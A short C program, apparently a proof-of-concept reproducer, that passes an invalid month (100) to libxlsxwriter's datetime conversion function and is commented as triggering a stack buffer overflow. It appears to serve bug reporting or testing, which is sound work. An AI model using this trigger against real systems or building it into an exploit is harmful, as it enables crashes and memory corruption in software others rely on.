#include <xlsxwriter.h>
#include <stdio.h>

int main() {
    lxw_datetime datetime = {
        .year = 2024,
        .month = 100,  // Invalid: must be 1-12
        .day = 1,
        .hour = 0,
        .min = 0,
        .sec = 0.0
    };
    
    printf("Testing datetime with month = %d\n", datetime.month);
    
    // This triggers stack buffer overflow
    double result = lxw_datetime_to_excel_datetime(&datetime);
    
    printf("Result: %f\n", result);
    return 0;
}

